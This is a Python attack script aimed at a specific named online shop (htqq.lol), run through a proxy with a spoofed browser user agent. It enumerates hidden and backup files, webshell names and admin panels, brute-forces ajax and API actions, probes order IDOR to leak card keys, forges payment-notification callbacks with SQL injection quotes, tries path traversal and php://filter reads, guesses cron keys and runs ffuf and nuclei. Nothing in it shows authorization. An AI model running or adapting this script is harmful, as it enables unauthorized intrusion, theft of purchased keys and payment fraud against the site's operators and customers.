#!/usr/bin/env python3
"""htqq.lol v8 full hidden vuln scan - run on HK with proxy."""
from __future__ import annotations
import json, os, re, ssl, subprocess, time, urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = os.environ.get("SCAN_TARGET", "htqq.lol")
BASE = f"https://{TARGET}/shop"
OUT = Path(os.environ.get("SCAN_OUT", f"/data/automation/results/{TARGET}/deep_v8_{datetime.now().strftime('%Y%m%d_%H%M%S')}"))
OUT.mkdir(parents=True, exist_ok=True)

PROXY = os.environ.get("PROXY_URL", "")
JAR = str(OUT / "session.jar")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
FINDINGS: list[dict] = []
RESULTS: list[dict] = []

def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(OUT / "scan.log", "a") as f:
        f.write(line + "\n")

def curl(url, method="GET", data=None, extra_hdr=None, timeout=18):
    cmd = ["curl", "-sk", "--max-time", str(timeout), "-c", JAR, "-b", JAR,
           "-A", UA, "-w", "\n__CURL__%{http_code}__%{size_download}"]
    if PROXY:
        cmd += ["-x", PROXY]
    if method == "POST":
        cmd += ["-X", "POST"]
        if data:
            cmd += ["-d", data]
    hdr = {"Referer": f"{BASE}/", "X-Requested-With": "XMLHttpRequest"}
    if extra_hdr:
        hdr.update(extra_hdr)
    for k, v in hdr.items():
        cmd += ["-H", f"{k}: {v}"]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
        out = r.stdout
        m = re.search(r"__CURL__(\d+)__(\d+)$", out)
        code = int(m.group(1)) if m else 0
        size = int(m.group(2)) if m else 0
        body = out[:m.start()] if m else out
        return code, size, body
    except Exception as e:
        return 0, 0, str(e)

def add_finding(sev, cat, title, detail, evidence=None, url=""):
    FINDINGS.append({
        "severity": sev, "category": cat, "title": title, "detail": detail,
        "url": url, "evidence": evidence or {}, "ts": datetime.now(timezone.utc).isoformat()
    })
    log(f"*** FINDING [{sev}] {title}")

def bootstrap():
    curl(f"{BASE}/", extra_hdr={})
    time.sleep(0.5)

# --- path lists ---
HIDDEN_PATHS = """
ajax.php api.php cron.php toollogs.php install/index.php install/install.lock
user/login.php user/reg.php user/recharge.php user/workorder.php user/connect.php
user/ajax.php user/ajax_chat.php user/shop.php user/upload.php user/message.php
user/findpwd.php user/qiandao.php user/index.php user/logout.php
sup/login.php sup/list.php sup/fakalist.php sup/reg.php sup/recharge.php
sup/record.php sup/workorder.php sup/ajax.php sup/upload.php sup/export.php
other/submit.php other/getshop.php other/epay_notify.php other/alipay_notify.php
other/wxpay_notify.php other/qqpay_notify.php other/notify.php
other/alipay.php other/wxpay.php other/qqpay.php other/return.php other/callback.php
includes/common.php includes/config.php includes/authcode.php includes/function.php
includes/database.php includes/db.php includes/360safe.php
template/ default/ assets/faka/ assets/js/ assets/css/
admin/ admin/login.php admin/index.php xiaoyewl/ houtai/ houtai888/ manage/
faka/ faka/admin/ pay/ order/ upload/ uploads/ files/ attachment/ data/
backup.sql database.sql dump.sql db.sql install.sql config.php.bak config.bak
.env .git/HEAD .git/config .svn/entries composer.json package.json
robots.txt sitemap.xml crossdomain.xml phpinfo.php info.php test.php debug.php
pi.php i.php php.php 1.php a.php shell.php cmd.php eval.php
rev_api.php api_orders_dump.php orders_dump.php getkm.php export.php dump.php
download.php get.php file.php upload.php webhook.php notify.php callback.php
pay.php buy.php shop.php index.php.bak ajax.php.bak api.php.bak
cron.php.bak install.php update.php upgrade.php migrate.php
user.php admin.php login.php register.php
""".split()

AJAX_ACTS = """
getcount getclass gettool gettoolnew getleftcount checklogin captcha query order
changepwd apply_refund pay payrmb cancel getshuoshuo getshareid getrizhi gift_start
share_invitegift_link SharePoster cart_list cart_info cart_empty cart_shop_item
cart_shop_del cart_buy cart_cancel connect quickreg login logout reg recharge
search siteinfo classlist goodslist getorder orders orderlist kmlist getkm export
dump backup config debug info status test upload file download notify callback
orders_dump api_orders_dump rev_api createorder selgo getkm sousuo checkcqq
tyid gid fcwfid create buykm kmquery kmsearch fakalist addkm delkm editkm
refund withdraw transfer coupon invite share poster qrcode geetest sms email
""".split()

API_ACTS = "search siteinfo classlist goodslist order orders getorder kmlist export dump backup config".split()

OTHER_NOTIFY = """
epay_notify alipay_notify wxpay_notify qqpay_notify notify callback return submit getshop
""".split()

def scan_paths():
    log("=== [1] hidden path scan ===")
    interesting = []
    for p in HIDDEN_PATHS:
        p = p.strip()
        if not p:
            continue
        url = f"{BASE}/{p}" if not p.startswith("http") else p
        code, size, body = curl(url)
        bl = body.lower()
        skip = code in (404, 0) or size < 3
        hit = False
        if not skip:
            if code == 403 and any(x in p for x in ("config", ".env", ".git", "backup", "includes")):
                hit = True
                interesting.append((p, code, size, "exists_403"))
            elif code == 200:
                if "no act" in bl and size < 80:
                    pass
                elif any(k in bl for k in ("kminfo", "password", "mysql", "root@", "app_key", "secret", "api_key", "db_", "warning:", "fatal error", "stack trace", "install.lock", "安装")):
                    hit = True
                    interesting.append((p, code, size, "sensitive_body"))
                elif size > 100 and "404 not found" not in bl and "403 forbidden" not in bl:
                    if any(x in p for x in (".php", "admin", "upload", "dump", "export", "debug", "install", "cron", "api", "rev")):
                        hit = True
                        interesting.append((p, code, size, "reachable"))
        RESULTS.append({"type": "path", "path": p, "code": code, "size": size})
        if hit:
            log(f"  path HIT {p} -> {code} size={size}")
        time.sleep(0.15)
    return interesting

def scan_ajax_acts():
    log("=== [2] ajax act enum ===")
    hits = []
    for act in AJAX_ACTS:
        act = act.strip()
        if not act:
            continue
        # GET
        code, size, body = curl(f"{BASE}/ajax.php?act={act}")
        bl = body.lower()
        if code == 200 and body and "no act" not in bl and "csrf" not in bl[:50].lower():
            if len(body) > 5 and "_guard" not in body[:200]:
                hits.append(("GET", act, body[:300]))
                log(f"  ajax GET {act}: {body[:120]}")
        time.sleep(0.12)
        # POST empty
        code2, size2, body2 = curl(f"{BASE}/ajax.php?act={act}", method="POST", data="a=1")
        if code2 == 200 and body2 and "no act" not in body2.lower():
            if "csrf" not in body2.lower() or act in ("order", "query", "getcount"):
                if len(body2) > 5 and "_guard" not in body2[:200] and body2 != body:
                    hits.append(("POST", act, body2[:300]))
                    log(f"  ajax POST {act}: {body2[:120]}")
        time.sleep(0.12)
    return hits

def scan_api():
    log("=== [3] api.php deep ===")
    hits = []
    variants = [
        "api.php?act={}", "api.php/?act={}", "api.php?act={}&id=1",
        "api.php/?act={}&id=1", "api.php?act={}&id=18044",
        "api.php/?act=search&id={}", "API.php/?act=search&id=1",
    ]
    for act in API_ACTS:
        for tmpl in variants:
            if "{}" not in tmpl:
                continue
            path = tmpl.format(act) if tmpl.count("{}") == 1 else tmpl.format("1")
            code, size, body = curl(f"{BASE}/{path}")
            if code == 200 and size > 10 and "kminfo" in body.lower():
                hits.append((path, body[:400]))
                add_finding("CRITICAL", "idor", f"api.php IDOR {path}", body[:200], {"body": body[:500]}, f"{BASE}/{path}")
            elif code == 200 and size > 20 and "_guard" not in body[:100]:
                if '"code":0' in body or "success" in body.lower():
                    hits.append((path, body[:200]))
                    log(f"  api HIT {path}: {body[:100]}")
            time.sleep(0.2)
    # POST api
    for act in API_ACTS:
        code, size, body = curl(f"{BASE}/api.php/?act={act}", method="POST", data="id=1")
        if code == 200 and size > 15 and "no act" not in body.lower() and "_guard" not in body:
            log(f"  api POST {act}: {body[:100]}")
            hits.append((f"POST act={act}", body[:200]))
        time.sleep(0.15)
    return hits

def scan_user_sup_api():
    log("=== [4] user/sup ajax acts ===")
    hits = []
    for prefix in ["user/ajax.php", "sup/ajax.php"]:
        for act in AJAX_ACTS[:40]:
            code, size, body = curl(f"{BASE}/{prefix}?act={act}", method="POST", data="page=1")
            if code == 200 and "no act" not in body.lower() and size > 5 and "_guard" not in body[:150]:
                if "csrf" not in body.lower() or "login" in body.lower():
                    hits.append((f"{prefix}?act={act}", body[:200]))
                    log(f"  {prefix} {act}: {body[:100]}")
            time.sleep(0.1)
    return hits

def scan_notify_sqli():
    log("=== [5] notify / callback ===")
    payloads = [
        "out_trade_no=1'&trade_status=TRADE_SUCCESS",
        "trade_no=1&trade_status=TRADE_SUCCESS&money=0.01",
        "out_trade_no=1&trade_status=TRADE_SUCCESS&type=alipay&sign=test",
    ]
    for ep in OTHER_NOTIFY:
        for p in payloads:
            code, size, body = curl(f"{BASE}/other/{ep}.php", method="POST", data=p)
            if size > 0 and "error" not in body.lower()[:20]:
                log(f"  notify {ep}: {body[:80]}")
            time.sleep(0.1)

def scan_mod_lfi():
    log("=== [6] mod/param injection ===")
    mods = ["buy", "cart", "query", "order", "list", "item", "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index", "buy&tid=1'"]
    for m in mods:
        code, size, body = curl(f"{BASE}/?mod={urllib.parse.quote(m)}")
        if code == 200 and ("root:" in body or "PD9waHA" in body or "fatal" in body.lower()):
            add_finding("CRITICAL", "lfi", f"mod LFI {m}", body[:200], {}, f"{BASE}/?mod={m}")
        time.sleep(0.15)

def scan_cron_install():
    log("=== [7] cron/install/debug keys ===")
    keys = ["", "test", "admin", "cron", "key", "345a36b5fa7be2bdd2f1724157952938",
            "htqq", "faka", "monitor", "update", "run", "do"]
    for k in keys:
        for q in [f"key={k}", f"do={k}", f"action={k}", f"pass={k}"]:
            code, size, body = curl(f"{BASE}/cron.php?{q}")
            if body and "不正确" not in body and "密钥" not in body and size > 2 and "_guard" not in body:
                add_finding("HIGH", "cron", f"cron.php?{q}", body[:200], {"body": body[:300]})
            time.sleep(0.1)
    for p in ["install/index.php", "install/update.php", "install/upgrade.php", "install/db.sql"]:
        code, size, body = curl(f"{BASE}/{p}")
        if code == 200 and size > 50:
            log(f"  install {p}: size={size} {body[:80]}")

def scan_order_idor():
    log("=== [8] order/query IDOR ===")
    import hashlib
    HASH = "345a36b5fa7be2bdd2f1724157952938"
    for oid in [1, 100, 18044, 18043]:
        for skey in ["", "test", hashlib.md5(str(oid).encode()).hexdigest(), HASH]:
            code, size, body = curl(f"{BASE}/ajax.php?act=order", method="POST",
                                    data=f"id={oid}&skey={skey}")
            if "kminfo" in body or ('"code":0' in body and "验证失败" not in body):
                add_finding("CRITICAL", "idor", f"order IDOR id={oid}", body[:300], {"skey": skey})
            time.sleep(0.15)
    for q in ["20250713180044", "18044", "000018044"]:
        code, size, body = curl(f"{BASE}/ajax.php?act=query", method="POST", data=f"qq={q}&type=1")
        if code == 500:
            pass  # known
        elif '"code":0' in body:
            add_finding("HIGH", "info_disclosure", f"query leak {q}", body[:300])
        time.sleep(0.2)

def scan_ffuf_subset():
    log("=== [9] ffuf faka paths (subset) ===")
    wl = "/data/wordlists/api-paths.txt"
    if not Path(wl).exists():
        return []
    out_ffuf = OUT / "ffuf_api.json"
    proxy_arg = f"-x {PROXY}" if PROXY else ""
    cmd = (
        f'ffuf -u "{BASE}/FUZZ" -w {wl} -mc 200,301,302,403,500 '
        f'-t 8 -rate 15 -timeout 12 -o {out_ffuf} -of json '
        f'-H "User-Agent: {UA}" -H "Referer: {BASE}/" {proxy_arg} 2>/dev/null'
    )
    subprocess.run(cmd, shell=True, timeout=300)
    hits = []
    if out_ffuf.exists():
        try:
            data = json.loads(out_ffuf.read_text())
            for r in data.get("results", [])[:30]:
                hits.append((r.get("input", {}).get("FUZZ"), r.get("status"), r.get("length")))
                log(f"  ffuf {r.get('input',{}).get('FUZZ')} -> {r.get('status')} len={r.get('length')}")
        except Exception:
            pass
    return hits

def scan_nuclei():
    log("=== [10] nuclei ===")
    out_n = OUT / "nuclei.txt"
    proxy_arg = f"-proxy {PROXY}" if PROXY else ""
    cmd = (
        f'nuclei -u "{BASE}/" -severity critical,high,medium '
        f'-tags exposure,misconfig,token,fpd,default-login,takeover,lfi,sqli '
        f'-silent -timeout 12 {proxy_arg} -o {out_n} 2>/dev/null'
    )
    subprocess.run(cmd, shell=True, timeout=600)
    if out_n.exists():
        lines = out_n.read_text().strip().splitlines()
        for ln in lines[:20]:
            log(f"  nuclei: {ln}")
            add_finding("HIGH", "nuclei", ln[:80], ln, {})
        return lines
    return []

def main():
    log(f"=== htqq v8 full scan -> {OUT} ===")
    log(f"PROXY={PROXY or 'none'}")
    bootstrap()
    path_hits = scan_paths()
    ajax_hits = scan_ajax_acts()
    api_hits = scan_api()
    user_hits = scan_user_sup_api()
    scan_notify_sqli()
    scan_mod_lfi()
    scan_cron_install()
    scan_order_idor()
    ffuf_hits = scan_ffuf_subset()
    nuclei_hits = scan_nuclei()

    summary = {
        "target": BASE, "ts": datetime.now(timezone.utc).isoformat(),
        "path_hits": path_hits, "ajax_hits": ajax_hits, "api_hits": api_hits,
        "user_hits": user_hits, "ffuf_hits": ffuf_hits, "nuclei_hits": nuclei_hits,
        "findings": FINDINGS, "results_count": len(RESULTS),
    }
    (OUT / "summary.json").write_text(json.dumps(summary, ensure_ascii=False, indent=2))
    (OUT / "findings.json").write_text(json.dumps(FINDINGS, ensure_ascii=False, indent=2))
    log(f"=== DONE findings={len(FINDINGS)} path_hits={len(path_hits)} ===")
    print(json.dumps({"out": str(OUT), "findings": len(FINDINGS)}, indent=2))

if __name__ == "__main__":
    main()
